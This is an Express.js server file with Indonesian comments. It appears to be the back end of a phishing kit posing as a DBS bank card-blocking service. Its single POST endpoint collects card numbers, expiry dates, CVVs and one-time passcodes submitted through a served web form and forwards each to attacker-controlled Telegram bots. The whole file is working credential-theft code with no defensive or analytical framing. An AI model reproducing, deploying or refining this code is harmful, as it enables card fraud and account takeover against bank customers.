const express = require('express');
const fetch = require('node-fetch');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware untuk parsing JSON dan form
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ➕ Tambahkan route ke halaman utama
app.get('/', (req, res) => {
  res.send('✅ Server berjalan dengan baik. Gunakan endpoint POST /kirim-ke-telegram untuk mengirim data.');
});

// ⬇️ ROUTE terlebih dahulu agar tidak tertutup static
app.post('/kirim-ke-telegram', async (req, res) => {
  console.log("Data diterima:", req.body); // debug log

  const { nomor, valid, cvv, otp, laporan } = req.body;

  let token;
  let message = "";

  if (otp) {
    token = process.env.BOT_TOKEN_OTP;
    message = `🔐 *Kode OTP Diterima*\n\n*OTP:* ${otp}`;
  } else if (nomor && valid && cvv) {
    token = process.env.BOT_TOKEN_BLOKIR;
    message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  } else if (laporan) {
    token = process.env.BOT_TOKEN_LAPORAN;
    message = `📄 *Laporan Kartu Bank Lain*\n\n${laporan}`;
  } else {
    return res.status(400).send("Data tidak lengkap");
  }

  const chat_id = process.env.CHAT_ID;
  if (!token || !chat_id) {
    return res.status(500).send("Token atau Chat ID belum diatur");
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
    });

    if (response.ok) {
      res.sendStatus(200);
    } else {
      const error = await response.json();
      res.status(500).send("Gagal mengirim ke Telegram: " + JSON.stringify(error));
    }
  } catch (error) {
    res.status(500).send("Gagal: " + error.message);
  }
});

// ⬇️ Public folder diakses setelah route
app.use(express.static(__dirname + '/public'));

// Jalankan server
app.listen(PORT, () => {
  console.log(`✅ Server aktif di http://localhost:${PORT}`);
});
